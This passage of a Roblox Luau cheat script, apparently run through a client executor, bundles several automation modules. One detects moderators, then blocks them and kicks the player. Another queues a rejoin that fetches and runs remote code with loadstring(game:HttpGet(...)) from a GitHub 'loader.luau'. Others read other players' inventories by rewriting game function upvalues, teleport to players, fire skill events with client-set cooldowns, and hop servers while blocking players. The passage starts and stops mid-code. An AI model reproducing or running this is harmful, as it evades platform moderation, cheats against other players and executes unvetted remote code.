        lifecycle.closed=true;api.Enabled=false;subscription:Disconnect()
    end
    return api
end

-- END BUNDLED MODERATOR WATCH
    end)()
    local makeRejoin=(function()
-- BEGIN BUNDLED MODERATOR REJOIN
-- Rejoin scheduling is armed before the confirmed-block kick can disconnect Lua.
return function(ctx)
    local api={Armed=false,Attempts=0,Started=false}
    local function available()
        return ctx.State.Running~=false and not ctx.State.StopEverything and not api.Started
    end
    local function worker()
        ctx.Sleep(1)
        local attempt=1
        while attempt<=3 and available()do
            api.Attempts=attempt
            ctx.State.ModeratorRejoinStatus="Rejoining current floor · attempt "..attempt
            local ok,reason=pcall(ctx.Teleport)
            if not ok then ctx.State.ModeratorRejoinError=tostring(reason)end
            ctx.Sleep(8)
            attempt=attempt+1
        end
        if available()then ctx.State.ModeratorRejoinStatus="Automatic rejoin did not start · rejoin manually"end
    end
    function api.MarkStarted()api.Started=true end
    function api.Kick(message)
        if api.Armed then return end
        api.Armed=true
        local queued,reason=pcall(ctx.Queue)
        if not queued then ctx.State.ModeratorRejoinError="Resume queue: "..tostring(reason)end
        ctx.Spawn(worker)
        ctx.Kick(message)
    end
    return api
end

-- END BUNDLED MODERATOR REJOIN
    end)()
    local teleport=game:GetService("TeleportService")
    local recovery=makeRejoin({State=state,Spawn=task.spawn,Sleep=task.wait,
        Queue=function()
            local enqueue=queue_on_teleport or queueonteleport or (syn and syn.queue_on_teleport)or (fluxus and fluxus.queue_on_teleport)
            assert(type(enqueue)=="function","Executor has no teleport queue")
            enqueue('loadstring(game:HttpGet("https://raw.githubusercontent.com/AttackerDestiny/balls/main/loader.luau"))()')
        end,Teleport=function()teleport:Teleport(game.PlaceId,player)end,Kick=function(reason)player:Kick(reason)end})
    state.ModeratorRejoin=recovery
    bind(player.OnTeleport,function(stage)
        if stage==Enum.TeleportState.Started or stage==Enum.TeleportState.InProgress then recovery.MarkStarted();state.SaveNow()end
    end)
    state.ModeratorWatch=makeWatch({State=state,Players=Players,Save=state.SaveNow,
        Pause=function()
            local search=state.SoloServerSearch
            if search and search.Active then pcall(search.Stop,"Moderator detection has priority")end
            state.TravelSerial=(state.TravelSerial or 0)+1;state.TravelBusy=false;state.AutomationTeleporting=false
            finishAttackBurst("Moderator detected");stopSword(true)
            if state.CancelSkillAura then state.CancelSkillAura("Moderator detected")end
            if state.CancelMiscSkill then state.CancelMiscSkill()end
            stopMovement("Moderator detected · blocking before disconnect",true)
            if state.FarmNoclip then state.FarmNoclip.Update()end
            if state.PanicToSpawn then state.PanicToSpawn()end
        end,
        Block=function(person,active)
            local expires=os.clock()+8
            repeat
                if not active()then return false end
                if state.BlockPlayerNative then break end
                task.wait(.04)
            until os.clock()>=expires
            assert(state.BlockPlayerNative,"Native block handler did not initialize")
            return state.BlockPlayerNative(person,active)
        end,
        Notify=function(reason)
            state.SafeModeStatus=reason;state.MultiSpotStatus=reason;state.ProgressionStatus=reason
            movementStatus(reason)
        end,Kick=recovery.Kick})
end

-- Player utilities publish state to the modern UI; no duplicate option controls.
do
    local makePlayerTools=(function()
-- BEGIN BUNDLED PLAYER TOOLS
-- Selection owns camera and inventory subscriptions as separate replaceable scopes.
return function(ctx)
    local state,players=ctx.State,ctx.Players
    local api={Viewing=false,InventoryVisible=false}
    local selected,selectedConnection=nil,nil
    local closed,inventoryQueued=false,false
    local inventoryConnections,subscriptions={},{}
    local cameraLease
    local function unsubscribe(list)
        for _,connection in ipairs(list)do connection:Disconnect()end
        table.clear(list)
    end
    local function listen(list,event,fn)list[#list+1]=event:Connect(fn)end
    local function notify()if ctx.Changed then ctx.Changed()end end
    function api.GetSelected()if selected and selected.Parent==players then return selected end end
    function api.Choices()
        local rows={}
        for _,person in ipairs(players:GetPlayers())do if person~=ctx.LocalPlayer then
            rows[#rows+1]={UserId=person.UserId,Name=person.Name,DisplayName=person.DisplayName}
        end end
        table.sort(rows,function(a,b)return a.Name:lower()<b.Name:lower()end)
        return rows
    end
    local function follow()
        local person=api.GetSelected()
        local character=person and person.Character
        local humanoid=character and character:FindFirstChildOfClass("Humanoid")
        local camera=ctx.Workspace.CurrentCamera
        if not closed and api.Viewing and not state.StopEverything and humanoid and humanoid.Health>0 and camera then
            camera.CameraSubject=humanoid;camera.CameraType=Enum.CameraType.Custom
        end
    end
    function api.SetViewing(value)
        value=value==true
        if value and state.StopEverything then return false,"Stop Everything is on"end
        if value and not api.GetSelected()then return false,"Select a player first"end
        local camera=ctx.Workspace.CurrentCamera
        if value and not api.Viewing and camera then cameraLease={Subject=camera.CameraSubject,Type=camera.CameraType}end
        local was=api.Viewing;api.Viewing=value;state.ViewingPlayer=value
        if value then follow()
        elseif was and camera then
            local own=ctx.LocalPlayer.Character
            local humanoid=own and own:FindFirstChildOfClass("Humanoid")
            local subject=humanoid or (cameraLease and cameraLease.Subject and cameraLease.Subject.Parent and cameraLease.Subject)
            if subject then camera.CameraSubject=subject end
            camera.CameraType=cameraLease and cameraLease.Type or Enum.CameraType.Custom
            cameraLease=nil
        end
        notify();return true
    end
    function api.InventoryRows()
        local person=api.GetSelected()
        local profile=person and ctx.Profiles and ctx.Profiles:FindFirstChild(person.Name)
        local inventory=profile and profile:FindFirstChild("Inventory")
        if not inventory then return {},"Inventory is not loaded for this player"end
        local groups={}
        for _,item in ipairs(inventory:GetChildren())do
            local value=item:FindFirstChild("Upgrade")
            local upgrade=value and value:IsA("ValueBase")and tonumber(value.Value)or 0
            local key=item.Name..":"..upgrade
            if not groups[key]then groups[key]={Name=item.Name,Upgrade=upgrade,Count=0}end
            groups[key].Count+=1
        end
        local rows={};for _,row in pairs(groups)do rows[#rows+1]=row end
        table.sort(rows,function(a,b)return a.Name==b.Name and a.Upgrade<b.Upgrade or a.Name<b.Name end)
        return rows,nil,inventory
    end
    function api.RefreshInventory()
        if closed or not api.InventoryVisible or state.StopEverything then return end
        local rows,message=api.InventoryRows();ctx.Inventory(rows,message,api.GetSelected())
    end
    local function invalidateInventory()
        if closed or not api.InventoryVisible or inventoryQueued then return end
        inventoryQueued=true
        task.defer(function()inventoryQueued=false;if not closed then api.RefreshInventory()end end)
    end
    local function observeInventory()
        unsubscribe(inventoryConnections)
        if not api.InventoryVisible then return end
        local _,_,inventory=api.InventoryRows()
        if inventory then
            for _,event in ipairs({inventory.ChildAdded,inventory.ChildRemoved,inventory.DescendantAdded,inventory.DescendantRemoving})do listen(inventoryConnections,event,invalidateInventory)end
            for _,item in ipairs(inventory:GetChildren())do
                listen(inventoryConnections,item:GetPropertyChangedSignal("Name"),invalidateInventory)
                local upgrade=item:FindFirstChild("Upgrade")
                if upgrade and upgrade:IsA("ValueBase")then listen(inventoryConnections,upgrade.Changed,invalidateInventory)end
            end
        end
        api.RefreshInventory()
    end
    function api.SetInventoryVisible(value)
        value=value==true
        if value and state.StopEverything then return false,"Stop Everything is on"end
        if value and not api.GetSelected()then return false,"Select a player first"end
        if ctx.NativeInventory then local ok,reason=ctx.NativeInventory(value and api.GetSelected()or nil);if not ok then return false,reason end end
        api.InventoryVisible=value;state.ViewingPlayerInventory=value
        observeInventory();notify();return true
    end
    function api.Select(id)
        local person=players:GetPlayerByUserId(tonumber(id)or 0)
        if not person or person==ctx.LocalPlayer then return false,"Player is no longer in this server"end
        if api.InventoryVisible and ctx.NativeInventory then local ok,reason=ctx.NativeInventory(person);if not ok then return false,reason end end
        if selectedConnection then selectedConnection:Disconnect()end
        selected=person;state.SelectedPlayerId=person.UserId
        selectedConnection=person.CharacterAdded:Connect(function(character)
            task.defer(function()
                local humanoid=character:FindFirstChildOfClass("Humanoid")or character:WaitForChild("Humanoid",3)
                if humanoid and selected==person and not closed then follow()end
            end)
        end)
        follow();observeInventory();notify();return true
    end
    function api.Teleport()
        if state.StopEverything then return false,"Stop Everything is on"end
        local person=api.GetSelected()
        if not person then return false,"Select a player first"end
        return ctx.Teleport(person)
    end
    listen(subscriptions,players.PlayerAdded,function()if ctx.RosterChanged then ctx.RosterChanged()end end)
    listen(subscriptions,players.PlayerRemoving,function(person)
        if selected and person.UserId==selected.UserId then
            api.SetViewing(false);api.SetInventoryVisible(false)
            if selectedConnection then selectedConnection:Disconnect();selectedConnection=nil end
            selected=nil;state.SelectedPlayerId=nil;notify()
        end
        if ctx.RosterChanged then task.defer(function()if not closed then ctx.RosterChanged()end end)end
    end)
    listen(subscriptions,ctx.Workspace:GetPropertyChangedSignal("CurrentCamera"),follow)
    listen(subscriptions,ctx.LocalPlayer.CharacterAdded,function()if api.Viewing then task.defer(follow)end end)
    function api.Destroy()
        if closed then return end
        api.SetViewing(false);api.SetInventoryVisible(false);closed=true
        if selectedConnection then selectedConnection:Disconnect();selectedConnection=nil end
        unsubscribe(inventoryConnections);unsubscribe(subscriptions);selected=nil;cameraLease=nil
    end
    return api
end

-- END BUNDLED PLAYER TOOLS
    end)()
    local makeInventoryView=(function()
-- BEGIN BUNDLED INVENTORY VIEW
-- Borrow the native inventory profile slot only while its identity is ours.
return function(ctx)
    local slot=nil
    local function resolve()
        if slot then return slot end
        local renderer=ctx.Function()
        assert(type(renderer)=="function","Native inventory renderer unavailable")
        local original=ctx.Read(renderer,2)
        assert(original==ctx.OwnProfile,"Inventory renderer profile layout differs from the supplied source")
        slot={Renderer=renderer,Original=original}
        return slot
    end
    local api={}
    function api.Set(profile)
        local success,reason=pcall(function()
            if profile==nil then
                if slot and slot.Borrowed then
                    if ctx.Read(slot.Renderer,2)==slot.Borrowed then ctx.Write(slot.Renderer,2,slot.Original)end
                    slot.Borrowed=nil
                end
                return
            end
            local current=resolve()
            local actual=ctx.Read(current.Renderer,2)
            assert(actual==current.Original or actual==current.Borrowed,"Inventory renderer is controlled by another script")
            ctx.Write(current.Renderer,2,profile)
            assert(ctx.Read(current.Renderer,2)==profile,"Executor did not switch inventory profile")
            current.Borrowed=profile
        end)
        if success then return true,nil end
        return false,tostring(reason)
    end
    return api
end

-- END BUNDLED INVENTORY VIEW
    end)()
    local renderer=makeInventoryView({OwnProfile=ReplicatedStorage.Profiles:FindFirstChild(player.Name),
        Function=function()return require(services.UI.Inventory).GetInventoryData end,
        Read=function(fn,index)
            assert(type(debug.getupvalue)=="function","Executor cannot read inventory renderer upvalues")
            local first,second=debug.getupvalue(fn,index)
            if second~=nil then return second end
            return first
        end,
        Write=function(fn,index,value)
            assert(type(debug.setupvalue)=="function","Executor cannot change inventory renderer upvalues")
            debug.setupvalue(fn,index,value)
        end})
    local tools
    local saved={selection=restore.SelectedPlayerId,view=restore.ViewingPlayer,inventory=restore.ViewingPlayerInventory}
    local function message(value)if state.Running then state.PlayerStatus=value or ""end end
    local function changed()
        if not tools or not state.Running then return end
        if saved.selection~=state.SelectedPlayerId or saved.view~=tools.Viewing or saved.inventory~=tools.InventoryVisible then
            saved={selection=state.SelectedPlayerId,view=tools.Viewing,inventory=tools.InventoryVisible}
            requestSave()
        end
    end
    local function teleport(target)
        if state.TravelBusy then return false,"Another teleport is still running"end
        local character=player.Character
        local root=character and character:FindFirstChild("HumanoidRootPart")
        local humanoid=character and character:FindFirstChildOfClass("Humanoid")
        local targetRoot=target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if not root or not humanoid or humanoid.Health<=0 or not targetRoot or root.Anchored then return false,"Player character is not loaded or ready"end
        state.TravelBusy=true
        local lease={};state.PlayerTravelLease=lease
        task.spawn(function()
            local moved=false
            local function active()return state.Running and not state.StopEverything and state.PlayerTravelLease==lease end
            local ok,reason=pcall(function()
                local expires=os.clock()+4
                repeat task.wait(.05)until not active()or not(state.Recovering or state.SkillCastRunning)or os.clock()>expires
                if not active()then return end
                assert(not state.SkillCastRunning and not state.Recovering,"Wait for the current skill to finish")
                assert(target.Parent==Players and target.Character and player.Character==character,"Player left or respawned")
                local other=target.Character:FindFirstChild("HumanoidRootPart")
                local living=target.Character:FindFirstChildOfClass("Humanoid")
                assert(other and living and living.Health>0,"Target character is unavailable")
                local point=other.Position+Vector3.new(0,5,0)
                assert(finitePoint(point)and point.Y>workspace.FallenPartsDestroyHeight+40,"Target position is too low")
                stopMovement("Travelling to player",true)
                ensureMovementController(character,root,humanoid,point)
                positionAlign.Position=point;pivotRoot(root,point)
                moved=true;lastSurfaceY=other.Position.Y+3;state.TeleportsSent=state.TeleportsSent+1
                state.LastPlayerTeleport={UserId=target.UserId,Name=target.Name,Requested=point,Actual=root.Position,At=os.clock()}
                task.wait(.75)
                if not active()then return end
                assert(root.Parent and (root.Position-point).Magnitude<18,"The game corrected this teleport")
                state.TravelHold=not(state.AutoFarm and state.Enabled)
                state.TravelHoldPosition=state.TravelHold and point or nil
            end)
            if state.PlayerTravelLease==lease then state.PlayerTravelLease=nil;state.TravelBusy=false end
            if not state.Running or state.StopEverything then return end
            if not ok then if moved then stopMovement("Player teleport stopped")end;message(tostring(reason))
            else message("")end
        end)
        return true
    end
    tools=makePlayerTools({State=state,Players=Players,LocalPlayer=player,Workspace=workspace,
        Profiles=ReplicatedStorage:FindFirstChild("Profiles"),
        NativeInventory=function(target)
            local profile=target and ReplicatedStorage.Profiles:FindFirstChild(target.Name)
            if target and not profile then return false,"Selected player's inventory profile is not loaded"end
            return renderer.Set(profile)
        end,
        Changed=changed,RosterChanged=function()if tools then state.PlayerChoices=tools.Choices()end end,
        Inventory=function(rows,reason)
            if not state.Running then return end
            state.PlayerInventoryRows=rows;state.PlayerInventoryMessage=reason;state.ViewedInventoryCount=#rows
        end,Teleport=teleport})
    state.PlayerTools=tools
    if saved.selection then tools.Select(saved.selection)end
    if restore.ViewingPlayer then tools.SetViewing(true)end
    if restore.ViewingPlayerInventory then tools.SetInventoryVisible(true)end
    state.PlayerChoices=tools.Choices();changed()
end

-- Support skills from the provided source, with native cooldown and stamina checks.
do
    local miscThread
    local catalog={"Cursed Enhancement","Heal","Mending Spirit","Summon Tree"}
    local function definition(name) return ReplicatedStorage.Database.Skills:FindFirstChild(name) end
    local function usable(name)
        local value=definition(name)
        return value and type(Skills.skillHandlers[name])=="function" and GameUI.IsSkillValid(value)==true
    end
    local function refreshMisc()
        local list=state.UI.MiscSkillOptions
        for _,child in ipairs(list:GetChildren()) do if child:IsA("GuiButton") then child:Destroy() end end
        state.MiscSkillChoices={}
        for index,name in ipairs(catalog) do
            if definition(name) and Skills.skillHandlers[name] then
                local allowed=usable(name)
                state.MiscSkillChoices[#state.MiscSkillChoices+1]={Name=name,Usable=allowed}
                local option=uiButton("MiscOption"..index,name..(allowed and "" or " (locked)"),index,28,list)
                option.Font=Enum.Font.Gotham; option.TextSize=11; option.Active=allowed
                option.TextColor3=allowed and Color3.fromRGB(226,229,243) or Color3.fromRGB(117,124,146)
                option.Activated:Connect(function() if allowed then state.SetMiscSkill(name) end end)
            end
        end
    end
    function state.SetMiscSkill(name)
        if not table.find(catalog,name) or not usable(name) then return false end
        state.SelectedMiscSkill=name
        state.MiscReserveStamina=false
        state.UI.MiscSkillDropdown.Text=name.."  v"
        state.UI.MiscSkillOptions.Visible=false
        requestSave()
        return true
    end
    function state.SetMiscSkillEnabled(enabled)
        if enabled and state.StopEverything then return false end
        state.MiscSkillEnabled=enabled==true
        if not enabled then state.MiscReserveStamina=false end
        state.UI.MiscSkillToggle.Text=state.MiscSkillEnabled and "Misc Skill · ON" or "Misc Skill · OFF"
        state.UI.MiscSkillToggle.BackgroundColor3=state.MiscSkillEnabled and Color3.fromRGB(114,88,229) or Color3.fromRGB(38,41,56)
        requestSave()
    end
    function state.CancelMiscSkill()
        if miscThread then pcall(task.cancel,miscThread); miscThread=nil end
        state.MiscCastRunning=false; state.MiscReserveStamina=false
    end
    local makeMisc=(function()
-- BEGIN BUNDLED MISC SKILL
-- Support intent is separate from casting: only requested effects reserve stamina.
return function(context)
    local state=context.State
    local api={Names={"Cursed Enhancement","Heal","Mending Spirit","Summon Tree"}}
    local sampledAt,castAfter=0,0
    local predicates={
        ["Cursed Enhancement"]=function(s)return s.Attacking==true and not s.BuffActive end,
        Heal=function(s)return s.MaxHealth>0 and s.Health<=s.MaxHealth*.66 end,
        ["Mending Spirit"]=function(s)return s.MaxHealth>0 and s.Health<=s.MaxHealth*.66 end,
        ["Summon Tree"]=function(s)return s.Stamina<=66 end,
    }
    function api.Needed(name,snapshot)
        local predicate=predicates[name]
        return predicate~=nil and predicate(snapshot)or false
    end
    function api.Update(now)
        now=now or os.clock()
        if not state.MiscSkillEnabled or state.StopEverything then state.MiscReserveStamina=false;return end
        if state.MiscCastRunning then state.MiscReserveStamina=true;return end
        if now<sampledAt then return end
        sampledAt=now+.2
        local snapshot=context.Read(state.SelectedMiscSkill)
        local wanted=snapshot and snapshot.Usable and snapshot.Health>0 and snapshot.MaxHealth>0
            and snapshot.Cooldown>=0 and api.Needed(state.SelectedMiscSkill,snapshot)
        state.MiscReserveStamina=wanted==true
        if not wanted or snapshot.Blocked or snapshot.Busy or snapshot.Stamina<snapshot.Cost or now<castAfter then return end
        castAfter=now+1
        context.Cast(state.SelectedMiscSkill,snapshot)
    end
    return api
end

-- END BUNDLED MISC SKILL
    end)()
    state.MiscController=makeMisc({State=state,
        Read=function(name)
            local value=definition(name)
            local character=player.Character
            local root=character and character:FindFirstChild("HumanoidRootPart")
            local entity=character and character:FindFirstChild("Entity")
            local health=entity and entity:FindFirstChild("Health")
            local stamina=entity and entity:FindFirstChild("Stamina")
            if not value or not root or not health or not stamina then return end
            local maximum=entity:FindFirstChild("MaxHealth")
            local constrained=health:IsA("IntConstrainedValue") or health:IsA("DoubleConstrainedValue")
            local maxHealth=constrained and health.MaxValue or maximum and maximum.Value or math.max(1,health.Value)
            return {Definition=value,Character=character,Entity=entity,Root=root,HealthValue=health,StaminaValue=stamina,
                Health=health.Value,MaxHealth=maxHealth,Stamina=stamina.Value,Cost=value.Cost.Value,
                Cooldown=Skills.GetCooldown(name),Usable=usable(name),BuffActive=name=="Cursed Enhancement" and character:GetAttribute("CursedEnhancement")==true,
                Attacking=state.IsAttackingEnemy(),
                Busy=state.SkillCastRunning or Skills.usingSkill~="none",
                Blocked=state.SafeModePanic or state.TravelBusy or state.Dodging or state.Recovering or state.ProtectionRetreating
                    or os.clock()<state.LagPauseUntil or (state.PingMs and state.PingMs>500)
                    or GameUI.IsMenuOpen() or not CanRunSkill(player,name)}
        end,
        Cast=function(name,snapshot)
            if state.StopEverything or not state.MiscSkillEnabled or state.MiscCastRunning then return false end
            state.MiscCastRunning=true
            miscThread=task.defer(function()
                local ok,message=pcall(function()
                    if state.StopEverything or not state.Running or not state.MiscSkillEnabled or player.Character~=snapshot.Character then return end
                    if name=="Cursed Enhancement" and not state.IsAttackingEnemy() then return end
                    local buffs=snapshot.Entity:FindFirstChild("Buffs")
                    local reduction=buffs and buffs:FindFirstChild("SkillReduction")
                    local cooldown=snapshot.Definition.Cooldown.Value*math.clamp(1-(reduction and reduction.Value or 0),0,1)
                    Skills.SetCooldown(name,cooldown)
                    pcall(GameUI.SkillUsed,name,cooldown)
                    ReplicatedStorage.Event:FireServer("Skills",{"UseSkill",name,{Direction=snapshot.Root.CFrame.LookVector}})
                    state.MiscSkillRequests+=1
                    local record={Name=name,At=os.clock(),Acknowledged=false}
                    state.LastMiscSkillCast=record
                    local deadline=os.clock()+math.clamp((state.PingMs or 100)/1000+.6,.8,1.5)
                    repeat
                        local curse=name=="Cursed Enhancement" and snapshot.Character:GetAttribute("CursedEnhancement")
                        if curse or snapshot.Stamina-snapshot.StaminaValue.Value>=math.max(1,snapshot.Cost*.5) then
                            record.Acknowledged=true
                            state.MiscSkillCasts+=1
                            break
                        end
                        task.wait(.04)
                    until os.clock()>=deadline or state.StopEverything or not state.Running or not snapshot.Root.Parent
                    if not record.Acknowledged and state.Running and not state.StopEverything then state.LastMiscSkillError="Support skill was not acknowledged" end
                end)
                if not ok then state.LastMiscSkillError=tostring(message) end
                state.MiscCastRunning=false; state.MiscReserveStamina=false; miscThread=nil
            end)
            return true
        end,
    })
    if not table.find(catalog,state.SelectedMiscSkill) then state.SelectedMiscSkill="Cursed Enhancement" end
    state.UI.MiscSkillDropdown.Text=state.SelectedMiscSkill.."  v"
    bind(state.UI.MiscSkillToggle.Activated,function() state.SetMiscSkillEnabled(not state.MiscSkillEnabled) end)
    bind(state.UI.MiscSkillDropdown.Activated,function()
        if state.StopEverything then return end
        skillList.Visible=false
        if not state.UI.MiscSkillOptions.Visible then refreshMisc() end
        state.UI.MiscSkillOptions.Visible=not state.UI.MiscSkillOptions.Visible
        if state.UI.MiscSkillOptions.Visible then revealOptions(state.UI.MiscSkillOptions) end
    end)
    refreshMisc()
    state.SetMiscSkillEnabled(restore.MiscSkillEnabled)
end



local padSlot=(function()
-- BEGIN BUNDLED PAD SLOT
-- Rank accounts once in pad-local geometry; cells never extend past its bounds.
return function(userId,players,width,depth,bodyWidth,bodyDepth)
    local function axis(size,body)
        local extent=math.max(0,(size-body)/2-.5)
        local cells=math.max(1,math.floor(2*extent/math.max(3,body+1))+1)
        return extent,cells
    end
    local x,columns=axis(width,bodyWidth)
    local z,rows=axis(depth,bodyDepth)
    local order=0
    for _,other in ipairs(players)do if other<userId then order+=1 end end
    local index=order%(columns*rows)
    local column=index%columns;local row=math.floor(index/columns)
    local function coordinate(cell,count,extent)
        if count<2 then return 0 end
        return extent*(2*cell/(count-1)-1)
    end
    return coordinate(column,columns,x),coordinate(row,rows,z)
end

-- END BUNDLED PAD SLOT
end)()
function state.PanicToSpawn(inPlace)
    local holdHere=inPlace==true
    if state.SafePanicHoldHere~=holdHere then state.SafePanicHerePosition=nil;state.SafePanicHereRoot=nil end
    state.SafePanicHoldHere=holdHere
    local first=not state.SafeModePanic
    state.SafeModePanic=true
    if first then
        state.SafePanicStartedAt=os.clock()
        state.TravelSerial=(state.TravelSerial or 0)+1;state.TravelBusy=false
        finishAttackBurst("Safe Mode panic");stopSword(true)
        if state.CancelSkillAura then state.CancelSkillAura("Safe Mode panic") end
        if state.CancelMiscSkill then state.CancelMiscSkill() end
        if state.MultiSpotController then state.MultiSpotController.Reset() end
        stopMovement(holdHere and "Safe Mode · holding current position"or "Holding at teleport pad",true)
        state.FollowTarget=nil;state.TravelFocus=nil
    end
    local character=player.Character
    local root=character and character:FindFirstChild("HumanoidRootPart")
    local humanoid=character and character:FindFirstChildOfClass("Humanoid")
    if not root or not humanoid or humanoid.Health<=0 then return false end
    local position
    if not position and holdHere then
        if state.SafePanicHereRoot~=root or not state.SafePanicHerePosition then
            state.SafePanicHereRoot=root;state.SafePanicHerePosition=root.Position
        end
        position=state.SafePanicHerePosition
    end
    if not position then
        local pad=state.SafePanicSpawnPart
        if not pad or not pad.Parent then
            local reference=destinations.spawn and destinations.spawn.Position or root.Position
            local bestDistance
            for _,candidate in ipairs(workspace:QueryDescendants("SpawnLocation"))do
                local distance=(candidate.Position-reference).Magnitude
                if not bestDistance or distance<bestDistance then pad,bestDistance=candidate,distance end
            end
            state.SafePanicSpawnPart=pad
        end
        if pad then
            local height=pad.Size.Y/2+humanoid.HipHeight+root.Size.Y/2+.5
            if state.AutoJoinFriendHolding then
                local ids={};for _,person in ipairs(Players:GetPlayers())do ids[#ids+1]=person.UserId end
                local x,z=padSlot(player.UserId,ids,pad.Size.X,pad.Size.Z,root.Size.X,root.Size.Z)
                position=pad.CFrame:PointToWorldSpace(Vector3.new(x,height,z))
            else position=pad.Position+Vector3.new(0,height,0)end
        elseif destinations.spawn then position=destinations.spawn.Position+Vector3.new(0,4,0)end
    end
    if not position then return false end
    if root~=movementRoot then stopMovement(nil,true) end
    ensureMovementController(character,root,humanoid,position)
    if positionAlign and positionAlign.Position~=position then positionAlign.Position=position end
    if first or (root.Position-position).Magnitude>3 then pivotRoot(root,position) end
    state.TravelHold=true;state.TravelHoldPosition=position;state.SafePanicPosition=position
    return true
end
function state.PanicInPlace()return state.PanicToSpawn(true)end
function state.ReleaseSafePanic()
    state.SafeRejoinRequested=false;state.SafeRejoinAway=nil;state.SafeRejoinDispatch=nil
    if not state.SafeModePanic then return end
    state.SafeModePanic=false;state.SafePanicPosition=nil;state.SafePanicHoldHere=nil;state.SafePanicHerePosition=nil;state.SafePanicHereRoot=nil
    stopMovement("Safe Mode · server protected",true)
    state.FollowTarget=nil
end

do
    local make=(function()
-- BEGIN BUNDLED SERVER ISOLATION
-- Confirmed native blocks plus bounded public matchmaking; no private-server claim.
return function(ctx)
    local api={Active=false,Phase="Idle",Status="Ready",JobId=ctx.JobId}
    local run={epoch=0,solo=nil,settle=0,deadline=nil,busy=false,sameReturn=false}
    local ticket
    local retriedUser
    local pending
    local function publish(message)
        api.Status=message
        if ctx.Notify then ctx.Notify(api)end
    end
    local function current(epoch)return api.Active and run.epoch==epoch end
    local function message(reason)
        local text=tostring(reason)
        return text:match(":%d+: (.*)")or text
    end
    local transient={"block dialog did not open","did not confirm the block","block was not confirmed",
        "getblockeduserids","blocked-user list","another native block confirmation","has not been registered"}
    local function retryable(reason)
        local text=tostring(reason or ""):lower()
        for _,phrase in ipairs(transient)do if text:find(phrase,1,true)then return true end end
        return false
    end
    local function save()
        local ok,saved=pcall(ctx.Save,ticket)
        assert(ok and saved==true,"Could not save the search; stopped before rejoining")
    end
    local function outsiders()
        local result={}
        for _,person in ipairs(ctx.GetPlayers())do
            if not ctx.IsAllowed or not ctx.IsAllowed(person)then result[#result+1]=person end
        end
        return result
    end
    function api.Stop(reason,outcome)
        api.RetryWasTeleporting=api.Phase=="Teleporting"
        api.Retryable=outcome~="Safe"and (api.RetryWasTeleporting or retryable(reason))
        run.epoch=run.epoch+1;run.solo=nil;run.deadline=nil;pending=nil
        api.Active=false;api.Phase="Idle";api.Outcome=outcome or "Stopped"
        if ticket then
            ticket.Active=false
            local ok,saved=pcall(ctx.Save,ticket)
            if not ok or saved~=true then reason=(reason or "Stopped").." (could not clear resume file)"end
        end
        publish(reason or "Stopped; added blocks remain in your Roblox account")
    end
    local function valid(resume)
        if type(resume)~="table"then return false end
        local age=type(resume.StartedAt)=="number"and ctx.Now()-resume.StartedAt
        local hops=resume.Hops
        local returns=resume.SameServerReturns
        return resume.Version==1 and resume.Active==true and resume.UserId==ctx.UserId and resume.PlaceId==ctx.PlaceId
            and type(resume.RunId)=="string"and #resume.RunId<=80
            and age and age>=0 and age<900
            and type(hops)=="number"and hops>=0 and hops<=12 and hops%1==0
            and type(resume.Visited)=="table"and type(resume.Added)=="table"and type(resume.SourceJob)=="string"
            and (returns==nil or type(returns)=="number"and returns>=0 and returns<=3 and returns%1==0)
    end
    local function guard(epoch,fn)
        local ok,result=pcall(fn)
        if not ok and current(epoch)then api.Stop(message(result))end
        return ok and current(epoch)
    end
    local function blocked(epoch)
        local result=ctx.GetBlocked()
        assert(type(result)=="table","Could not read the blocked-user list")
        if not current(epoch)then return nil end
        return result
    end
    local function hop(epoch)
        if not current(epoch)then return end
        ticket.Hops=ticket.Hops+1;ticket.SourceJob=ctx.JobId;ticket.Visited[ctx.JobId]=true
        if ctx.SnapshotSettings then ticket.Features=ctx.SnapshotSettings()end
        save()
        if not current(epoch)then return end
        ctx.Queue(ticket.RunId)
        if not current(epoch)then return end
        api.Phase="Teleporting";run.deadline=ctx.Clock()+35
        publish("Rejoining this floor ("..ticket.Hops.."/12)...")
        ctx.Hop()
    end
    function api.Start(resume)
        if api.Active or run.busy then return false end
        if resume and not valid(resume)then
            ticket=type(resume)=="table"and resume or nil
            api.Stop("Resume expired, changed floor/account, or did not change server")
            return false
        end
        run.epoch=run.epoch+1;run.sameReturn=false;retriedUser=nil
        local epoch=run.epoch
        api.Active=true;api.Phase="Preparing";api.Outcome="Searching"
        publish("Checking block access and rejoin support...")
        return guard(epoch,function()
            if resume and ctx.RestoreSettings then ctx.RestoreSettings(resume.Features)end
            if resume and (resume.SourceJob==ctx.JobId or resume.Visited[ctx.JobId])then
                ticket=resume;api.Ticket=ticket
                ticket.SameServerReturns=(ticket.SameServerReturns or 0)+1
                assert(ticket.SameServerReturns<=3,"Same-server retry limit reached · matchmaking did not move you")
                run.sameReturn=true
            end
            ctx.Preflight()
            if not current(epoch)or not blocked(epoch)then return end
            ticket=resume or {Version=1,Active=true,UserId=ctx.UserId,PlaceId=ctx.PlaceId,
                RunId=ctx.NewId(),StartedAt=ctx.Now(),Hops=0,SourceJob=ctx.JobId,Visited={},Added={}}
            if not resume and ctx.SnapshotSettings then ticket.Features=ctx.SnapshotSettings()end
            assert(not ticket.Visited[ctx.JobId]or run.sameReturn,"Matchmaking returned a visited server; search stopped")
            api.Ticket=ticket;save()
            if not current(epoch)then return end
            local settling=run.sameReturn and math.min(1,.25*(ticket.SameServerReturns-1))or (ctx.SettleSeconds or 8)
            run.settle=ctx.Clock()+settling;run.solo=nil;api.Phase="Waiting"
            publish(run.sameReturn and ("Returned to the same server · retry "..ticket.SameServerReturns.."/3 pending")or "Checking this floor's population...")
        end)
    end
    local function sameServer(epoch,people)
        if not run.sameReturn then return false end
        if ticket.Hops>=12 then api.Stop("12-hop search limit reached");return true end
        local confirmed=blocked(epoch)
        if not confirmed then return true end
        for _,person in ipairs(people)do
            if confirmed[person.UserId]then ticket.LastBlockedUserId=person.UserId;hop(epoch);return true end
        end
        for _,person in ipairs(people)do
            assert(person.UserId~=ticket.LastBlockedUserId,"Block was not confirmed after same-server return; no rejoin attempted")
        end
        run.sameReturn=false
        return false
    end
    local function confirmPending(epoch)
        if api.Phase~="Block settling"then return false end
        if ctx.IsPresent(pending)then
            local confirmed=blocked(epoch)
            if not confirmed then return true end
            assert(confirmed[pending.UserId],"Block was not confirmed; no rejoin attempted")
        end
        hop(epoch);return true
    end
    local function chooseAndBlock(epoch,people)
        local list=blocked(epoch)
        if not list then return end
        local eligible={}
        for _,person in ipairs(people)do
            if list[person.UserId]then
